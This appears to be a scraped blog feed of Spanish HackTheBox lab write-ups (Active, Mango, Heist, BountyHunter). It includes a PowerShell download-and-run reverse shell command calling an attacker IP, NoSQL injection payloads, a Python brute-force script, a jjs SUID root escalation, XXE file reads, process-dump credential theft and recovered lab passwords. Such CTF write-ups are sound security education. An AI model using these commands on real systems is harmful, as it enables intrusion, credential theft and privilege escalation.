10.10.10.100:49171(...)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-01-20 01:42:44Z)135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack464/tcp open kpasswd5? syn-ack593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack5722/tcp open msrpc syn-ack Microsoft Windows RPC9389/tcp open mc-nmf syn-ack .NET Message Framing49152/tcp open msrpc syn-ack Microsoft Windows RPC49153/tcp open msrpc syn-ack Microsoft Windows RPC49154/tcp open msrpc syn-ack Microsoft Windows RPC49155/tcp open msrpc syn-ack Microsoft Windows RPC49157/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc syn-ack Microsoft Windows RPC49165/tcp open msrpc syn-ack Microsoft Windows RPC49170/tcp open msrpc syn-ack Microsoft Windows RPC49171/tcp open msrpc syn-ack Microsoft Windows RPCEnumeración SMBComenzando con CrackMapExec, haremos una enumeración básica.Se obtiene el dominio: active.htb y el nombre de la máquina: DC.Utilizando un usuario y contraseña null es posible listar directorios compartidos SMB. En donde se obtienen permisos de lectura para el share Replication.Ingresaremos al recurso compartido haciendo uso de smbclient y descargaremos el contenido de manera recursiva.&amp;gt; smbclient //10.10.10.100/Replication -NAnonymous login successfulTry &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; dir . D 0 Sat Jul 21 06:37:44 2018 .. D 0 Sat Jul 21 06:37:44 2018 active.htb D 0 Sat Jul 21 06:37:44 2018 5217023 blocks of size 4096. 279252 blocks availablesmb: \\&amp;gt; recurse onsmb: \\&amp;gt; prompt offsmb: \\&amp;gt; mget *Obteniendo credencialesDentro de la carpeta active.htb se puede visualizar lo siguiente.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&amp;gt;&amp;lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&amp;gt;&amp;lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;Haciendo una búsqueda rápida en la web, vemos que el archivo Groups.xml sin duda es interesante ya que éste puede almacenar credenciales relacionadas a políticas de grupo o GPO.En el archivo se obtiene el usuario SVC_TGS y vemos un elemento llamado cpassword que contiene una cadena de caracteres que pueden ser descifrados con la ayuda de gpp-decrypt.Teniendo estas credenciales, procedemos a chequearlas con cme.Posteriormente verificaremos si existen más usuarios por enumerar haciendo un bruteforcing de RID.No se obtienen nuevos usuarios de interés.KerberoastingAhora que tenemos un usuario con credenciales válidas realizaremos un ataque Kerberoasting. GetUserSPNs.py active.htb/SVC_TGS -request -dc-ip 10.10.10.100Guardaremos el hash en el archivo hash y lo crackearemos con john utilizando el diccionario rockyou.txtVerificaremos la contraseña con cme.Consola como AdministradorEn este punto que ya poseemos credenciales válidas del usuario Administrator, solo bastaría utilizar psexec para loguear al sistema, pero en este caso quiero una consola a través de PowerShell.Para obtener una consola interactiva de Powershell, usaremos el parámetro -x de CrackMapExec para ejecutar comandos y obtener una conexión inversa. El proceso a realizar es el siguiente. Descargar el script Invoke-PowerShellTcp y modificarlo para entablar una conexión hacia la dirección IP de nuestra máquina a través del puerto 8443. Compartir el script con un servidor web en python3 Iniciar un listener para obtener la reverse shell. Ejecutar el siguiente comando de cme con las credenciales de Administrador.cme smb 10.10.10.100 -u &#39;Administrator&#39; -p &#39;Ticketmaster1968&#39; -x &quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.6:8000/IPS.ps1&#39;)&quot;Ya teniendo nuestra shell, podemos ejecutar una simple búsqueda para listar las flags.Get-ChildItem -Path C:\\Users -Recurse -Include user.txt, root.txt | select FullNameY eso sería todo para Active. ¡FELIZ HACKING!" }, { "title": "Mango Writeup [ES] - HackTheBox", "url": "/Mango-Writeup-HackTheBox/", "categories": "HTB", "tags": "medium, linux, php, noSQL, SUID", "date": "2021-12-15 13:00:00 -0300", "snippet": "Mango es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución.InformaciónEsta box introduce conceptos de inyección NoSQL a través de un panel de Login, la manera en que se obtendrá información será a través de códigos HTTP, en donde en base a fuzzing para enumerar credenciales, se recibirá distintas respuestas dependiendo si los datos son correctos o no. Posteriormente, tendremos que loguear por SSH con las credenciales obtenidas y migrar a otro usuario antes de abusar de los permisos SUID en un binario que se encuentra alojado en la máquina para finalmente convertirnos en root.EnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un solo comando. rustscan 10.10.10.149 -- -sC -sV | tee ports-rustcan.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.162:22Open 10.10.10.162:80Open 10.10.10.162:443(...)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYCdNRHET98F1ZTM+H8yrD9KXeRjvIk9e78JkHdzcqCq6zcvYIqEZReb3FSCChJ9mxK6E6vu5xBY7R6Gi0V31dx0koyaieEMd67PU+9UcjaAujbDS3UgYzySN+c5GV/ssmA6wWHu4zz+k+qztqdYFPh0/TgrC/wNPWHOKdpivgoyk3+F/retyGdKUNGjypXrw6v1faHiLOIO+zNHorxB304XmSLEFswiOS8UsjplIbud2KhWPEkY4s4FyjlpfpVdgPljbjijm7kcPNgpTXLXE51oNE3Q5w7ufO5ulo3Pqm0x+4d+SEpCE4g0+Yb020zK+JlKsp2tFJyLqTLan1buN| 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqSZ4iBMzBrw2lEFKYlwO2qmw0WPf76ZhnvWGK+LJcHxvNa4OQ/hGuBWCjVlTcMbn1Te7D8jGwPgbcVpuaEld8=| 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1sFdLYacK+1f4J+i+NCAhG+bj8xzzydNhqA1Ndo/xt80/tcp open http syn-ack Apache httpd 2.4.29| http-methods:|_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 403 Forbidden443/tcp open ssl/http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Mango | Search Base| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/organizationalUnitName=None/emailAddress=admin@mango.htb| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/organizationalUnitName=None/emailAddress=admin@mango.htb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-09-27T14:21:19| Not valid after: 2020-09-26T14:21:19| MD5: b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6| SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95| -----BEGIN CERTIFICATE-----| MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD| VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO| TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct| b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw| HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x| DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy| diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h| bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2| f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V| G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA| 9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL| 2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr| arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw| UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b| BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF| AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9| HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ| JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ| YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB| Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP| /UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernelResumen puertos Puerto Estado Servicio 22/tcp Abierto OpenSSH 7.6p1 Ubuntu 80/tcp Abierto Apache httpd 2.4.29 443/tcp Abierto Apache httpd 2.4.29 Enumeración webIniciando con la enumeración web, sabemos que tenemos HTTP y HTTPS disponibles, con esto lo primero a realizar es entrar por puerto 80 utilizando la dirección IP de Mango y vemos que no despliega ninguna página. Conociendo la estructura de HTB podemos suponer que se aplique virtual hosting, por lo que toca agregar la entrada correspondiente a /etc/hosts.Al consultar mango.htb se visualiza un buscador al estilo de google.Rápidamente se verifica el código y vemos que el buscador no hace nada relevante, solo existe un enlace a otro recurso llamado analytics.php.Nuevamente no se detecta nada que sea de interés.Por otro lado y recordando que el puerto 443 se encuentra expuesto, sería recomendable revisar el certificado SSL del sitio para extraer información.Se obtiene lo siguiente. Usuario potencial: admin@mango.htb Subdominio: staging-order.mango.htbEn este último vemos un panel de autenticación de usuarios.En base a todo lo descubierto anteriormente, hasta ahora se tendría mapeada la siguiente estructura en el servidor web.Estructura webgraph LR; id1(10.10.10.162) --&amp;gt; id2(mango.htb); id1(10.10.10.162) --&amp;gt; id4(staging-order.mango.htb); id2(mango.htb) --&amp;gt; id5(/index.php); id2(mango.htb) --&amp;gt; id7(/analytics.php); id4(staging-order.mango.htb) --&amp;gt; id6(/index.php);Acceso inicialPartiendo desde el panel de login descubierto en http://staging-order.mango.htb/index.php, después de muchos intentos fallidos de inyección XXS y SQLi descubrimos que la base de datos es una del tipo no relaciónal NoSQL. Se puede inferir que se trata de MongoDB debido a la similitud con el nombre de la máquina.Interceptamos y enviamos al repeater de BurpSuite una petición al panel de login para analizarla.Se descubre que al ingresar credenciales inválidas se recibe un código de estado 200 OK y la web no entrega feedback con respecto a si el usuario existe o no. Podemos usar esta respuesta para determinar si las credenciales son válidas, suponiendo que retornará un código 3XX cuando lo sean.Inyección NoSQLgraph LR; id1(staging-order.mango.htb/index.php) --&amp;gt;|Inyección NoSQL|id2[(Database)];Para intentar la inyección NoSQL, utilizaremos la web de PayloadAllTheThings. Entre los payloads más comunes tenemos: login[$regex]=a.*&amp;amp;pass[$ne]=lol username[$ne]=toto&amp;amp;password[$regex]=m.*Por lo visto las bases de datos NoSQL se pueden consultar a través de expresiones regulares u operadores binarios. Para las expresiones regulares se utilizará [$regex] en el nombre del campo enviado por POST seguido de la expresión que especifiquemos.Algo como username[$regex]=^a.* nos ayudará a fuzzear el nombre de usuario, haciendo una iteración en la posición de a. De esta forma podemos ir construyendo el nombre aprovechando * que opera como comodín.Para el caso de el campo password, por el momento haremos lo siguiente password[$gt]=&quot;&quot;. Esta consulta devolverá True cuando la contraseña real sea mayor que &quot;&quot; (una cadena vacía), por consiguiente servirá hasta enumerar los usuarios.Enumeración de usuariosEsto se puede adaptar a la estructura del login actual para, primeramente, enumerar el usuario. Quedaría de la siguiente forma: username[$regex]=^a.*&amp;amp;password[$gt]=&quot;&quot;&amp;amp;login=loginEnviando esto por burpsuite hacia el panel de login, vemos que se recibe una respuesta con código 302 Found, lo cual indica que la letra a es el primer caracter del usuario.Validamos enviando otro caracter distinto, y efectivamente la respuesta del servidor cambia a un 200 OK, por lo que el fuzzing funciona correctamente.Sabiendo esto, y para trabajar más rápido, haré la enumeración de usuarios con el intruder de BurpSuite. En positions se definirá en donde aplicaremos el fuzzing.Y en Payloads cargaremos el diccionario char.txt de SecLists.Le daremos a Start attack y ordenaremos por la columna Status. Al cabo de un momento se obtienen dos caracteres válidos (a, m), lo que nos da a pensar que al menos existen dos usuarios en la BD.Después de un tiempo se logran enumerar los usuarios:adminmangoEnumeración de contraseñasEn el caso de las contraseñas, para acelerar el proceso, he creado un script en Python 3.#!/usr/bin/python3# Author: https://brsalcedom.github.ioimport requests, string, refrom termcolor import colored, cprintfrom pwn import *users = [&#39;admin&#39;, &#39;mango&#39;]url = &quot;http://staging-order.mango.htb/index.php&quot;burp = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;}payload = string.ascii_letters + string.digits + string.punctuationdef def_handler(sig, frame): print(&quot;\\n[!] Exiting...&quot;) sys.exit(1)#CTRL + Csignal.signal(signal.SIGINT, def_handler)p1 = log.progress(&quot;Bruteforcing&quot;)p2 = log.progress(&quot;Username&quot;)p3 = log.progress(&quot;Password&quot;)print()def brute(username): password = &quot;&quot; p2.status(username) for pos in range(1,50): for char in payload: if char in [&quot;*&quot;, &quot;+&quot;, &quot;.&quot;, &quot;?&quot;, &quot;|&quot;, &quot;\\\\&quot;]: continue p1.status(&quot;testing [{}] on position [{}]&quot;.format(char, pos)) post_data = { &#39;username&#39; : username, &#39;password[$regex]&#39; : &#39;^{}{}.*&#39;.format(password, char), &#39;login&#39; : &#39;login&#39; } r = requests.post(url, data=post_data) status_code = re.findall(r&#39;\\d{3}&#39;, str(r.history)) if status_code: password += char p3.status(password) break # Testing if password is valid post_data = { &#39;username&#39; : username, &#39;password&#39; : password, &#39;login&#39; : &#39;login&#39; } r2 = requests.post(url, data=post_data) if &#39;Under Plantation&#39; in r2.text or pos &amp;gt; len(password): p3.status(&quot;Password obtained!&quot;) cprint(&quot;\\n[+] Credentials: {} - {}&quot;.format(username, password), &#39;white&#39;) breakif __name__ == &#39;__main__&#39;: for user in users: brute(user)admin:t9KcS3&amp;gt;!0B#2mango:h3mXK8RhU~f{]f5HCon esta información, ya podemos intentar utilizar las credenciales obtenidas para conectarnos a través de SSH.En el caso del user admin vemos que nos rechaza la conexión por SSH, pero es posible cambiar a éste user una vez logueados con el user mango.Escalada de privilegiosYa como el user admin y como parte de la enumeración básica, buscaremos archivos con permisos SUID con la ayuda de suid3num.py.Encontramos el binario jjs con permiso SUID. Esto se puede explotar fácilmente utilizando GTFObins.Según la web, se puede explotar ejecutando el siguiente comando: echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&#39;).waitFor()&quot; | ./jjsEsto, al ejecutarlo hizo que se colgara la consola, por lo tanto, en vez de conseguir una consola como root, intentaremos cambiar los permisos de /bin/bash para asignarle SUID. echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;chmod +s /bin/bash&#39;).waitFor()&quot; | jjsUna vez aplicado el comando, ya estarían modificados los permisos de /bin/bash y nos podemos convertir a root sin inconvenientes.Ya siendo root, solo restaría listar el contenido de las flags para ingresarlas en la plataforma. Dicho esto, eso sería todo para Mango." }, { "title": "Heist Writeup [ES] - HackTheBox", "url": "/Heist-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, windows, dump-credentials", "date": "2021-11-29 13:00:00 -0300", "snippet": "Heist es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución.InformaciónEnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un solo comando. rustscan 10.10.10.149 -- -sC -sV | tee ports-rustcan.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.149:80Open 10.10.10.149:135Open 10.10.10.149:445Open 10.10.10.149:5985Open 10.10.10.149:49669(...)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds? syn-ack5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49669/tcp open msrpc syn-ack Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Resumen puertos Puerto Estado Servicio 80/tcp Abierto http - Microsoft IIS httpd 10.0 135/tcp Abierto Microsoft Windows RPC 445/tcp Abierto SMB - microsoft-ds 5985/tcp Abierto WinRM - Microsoft HTTPAPI httpd 49669/tcp Abierto Microsoft Windows RPC Enumeración webLo primero será ingresar a la web y ver que hay expuesto. Se aprecia un login, en donde existe la opción de ingresar como usuario invitado.Al entrar como invitado se visualiza una especie de mesa de ayuda con información que podría ser relevante. De primeras se identifica que los usuarios Hazard y admin pueden ser usuarios potenciales del sistema.El ticket contiene un archivo adjunto que al abrirlo, revela un archivo de configuración de un router cisco.De esto podemos extraer potenciales usuarios y contraseñas. Pero antes, habrá que tratar de convertir o crackear los hashes obtenidos.enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408En el caso de las password 7 existe un recurso online que permite desencriptar este tipo de contraseñas.Para el último hash, deberemos utilizar john para romperlo con fuerza bruta utilizando rockyou.txt john --wordlist=/usr/share/wordlists/rockyou.txt hashPor lo tanto, tendríamos lo siguiente. users.txthazardrout3radmin passwords.txt$uperP@sswordQ4)sJu\\Y8qz*A3?dstealth1agentAcceso inicialCon esta información y utilizando crackmapexec, realizaremos un password spray para detectar si existen credenciales válidas con la información que se ha recopilado hasta el momento.Testeando nuevamente con CME validamos que el usuario no tiene permisos para el acceso remoto al protocolo WinRM.Continuando con la enumeración, ahora que tenemos credenciales válidas, se puede intentar un brute-forcing de usuarios a través de RID. Y al cabo de unos segundos se obtienen más usuarios.Se agregan al archivo users.txt y realizaremos nuevamente el password spray. Esta vez utilizando el módulo smb_login de metasploit, ya que por algún motivo CME no muestra más matches una vez que encuentra una credencial válida.Y como resultado se obtiene una credencial válida para el user Chase. Nuevamente se intenta el login a través de WinRM, esta vez con éxito.Escalada de privilegiosProcedemos a loguear al sistema con Evil-WinRM. evil-winrm -i 10.10.10.149 -u &#39;Chase&#39; -p &#39;Q4)sJu\\Y8qz*A3?d&#39;Una vez dentro, haciendo enumeración básica, se detecta algo inusual, al revisar los procesos se ve que está en ejecución Firefox, el cual no viene instalado por defecto en Windows. Esto nos da un indicio de que es probable que juegue un rol en la escalada de privilegios.Siguiendo esta lógica, lo siguiente será realizar un dump del proceso de Firefox para ver que se encuentra almacenado. Para esto utilizaremos una herramienta nativa de Microsoft que se puede descargar desde su web oficial - Procdump.Descargamos la herramienta y la subimos a la máquina víctima.En su primera ejecución, deberemos aceptar el EULA y posterior a esto realizar el dump. Para esto existen los siguientes modos:En esta ocasión utilizaremos el modo Full, especificando un PID o número de proceso de Firefox. .\\procdump64.exe -ma 6380Al cabo de unos segundos obtendremos un archivo con extensión .dmp el cual podríamos intentar leer utilizando strings. Esto se puede realizar transfiriendo el archivo hacia nuestro Parrot o bien subir el binario para Windows de la herramienta strings.Por lo tanto, haciendo uso de Impacket para compartir un server SMB, transferiremos el archivo a nuestra máquina para leer su contenido. strings firefox.exe_211214_081618.dmp -n 30 &amp;gt; output.txt grep --color &quot;password&quot; output.txtY obtenemos la siguiente string.http://localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=De la cual se puede leer la password 4dD!5}x/re8]FBuZ. Podemos suponer que esta es la contraseña del usuario Administrador, por lo que ya podemos conectarnos y leer las flags.Y esto sería todo para la máquina Heist, una máquina sencilla pero viene bien para repasar conceptos." }, { "title": "BountyHunter Writeup [ES] - HackTheBox", "url": "/BountyHunter-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, linux, xxe, python, web", "date": "2021-11-26 17:00:00 -0300", "snippet": "BountyHunter es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.InformaciónEnumeraciónNMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. nmap -p- -sS --min-rate 4000 -n -v -oG allPorts.gnmap 10.10.11.100Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 01:12 -03Initiating SYN Stealth Scan at 01:12Scanning 10.10.11.100 [65535 ports]Discovered open port 22/tcp on 10.10.11.100Discovered open port 80/tcp on 10.10.11.100Completed SYN Stealth Scan at 01:13, 23.87s elapsed (65535 total ports)Nmap scan report for 10.10.11.100Host is up (0.15s latency).Not shown: 65533 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 24.23 secondsPosteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados. nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.15s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Resumen puertos Puerto Estado Servicio 22/tcp Abierto OpenSSH 8.2p1 - Ubuntu 80/tcp Abierto Apache httpd 2.4.41 Enumeración webLo primero que se visualiza al apuntar a la IP de la máquina, es una página web simple que simula ser una empresa de pentesting.En el menú se encuentra un acceso que parece interesante.El enlace Portal redirige hacia el recurso portal.php que a su vez indica otro enlace para testear un sistema para registrar bountys.Siguiendo el enlace se llega a log_submit.php, el cual es un formulario que permite ingresar cuatro valores para catalogar un bounty.Lo primero en este caso es verificar si este formulario es vulnerable a xss o sqli, pero después de intentar un momento, se verifica que no lo es.Al darle a submit, entrega una vista previa de “como se ingresaría a la base de datos” si el sistema estuviera listo.Verificando el código fuente, se identifica que la web llama a un recurso javascript llamado bountylog.js.Dentro se visualiza como se ejecuta una petición de tipo POST hacia la url tracker_diRbPr00f314.php y antes de emitirla, la pasa por la función btoa, la cual se encarga de encodear en base64 la data.Siguiendo adelante, lo más cómodo es interceptar la petición con Burp Suite y validamos que efectivamente, la data viaja encodeada en base64 y urlencode.Utilizando el decoder nativo de Burp, se puede reversar la string para obtener su valor, lo cual muestra un formato tipo xml en donde viaja lo ingresado en el formulario anterior.Sabiendo esto, es posible pensar que sea vulnerable a inyecciones XXE. Bajo esta base, se prueba intentar listar el archivo /etc/passwd creando la entidad xxe e inyectándola en el campo title.Al darle send desde el repeater de Burp, se obtiene una respuesta en blanco, por lo que seguramente el sistema espera que se envíe la consulta encodeada.Efectivamente al realizar el encode base64 + urlencode se obtiene capacidad de leer archivos locales de la máquina.Ganando accesoPara este caso he desarrollado un pequeño script en python31 que permite leer archivos locales utilizando dos modos: file: Permite leer archivos locales. wrapper: Permite utilizar el wrapper PHP para obtener el código de un archivo en base64.La utilización del script es como se muestra a continuación. python3 xxe.py &amp;lt;mode&amp;gt; &amp;lt;file&amp;gt;De esta forma se obtiene el resultado desde consola y se automatiza el encoding para avanzar más rápido en la extracción de información.Se obtiene un usuario potencial: development que posee una consola tipo bash. Ahora solo restaría conseguir una contraseña para intentar una autenticación contra el servicio SSH que se encontraba expuesto.Continuando con la enumeración web, se lanza un fuzzing con gobuster para detectar posibles recursos interesantes en php. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -x &quot;php,html,txt&quot; -t 100 --no-errorSe encuentra un archivo llamado db.php que se encuentra en la raíz de la web. Al utilizar nuestro script xxe.py con el modo wrapper para encodearlo en base64, se obtiene la siguiente string.PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=al decodificarla se obtienen credenciales para una base de datos.&amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;Ahora que se tienen credenciales, se pueden testear contra el servicio SSH.Y resultan ser válidas para el usuario development. Ahora solo resta 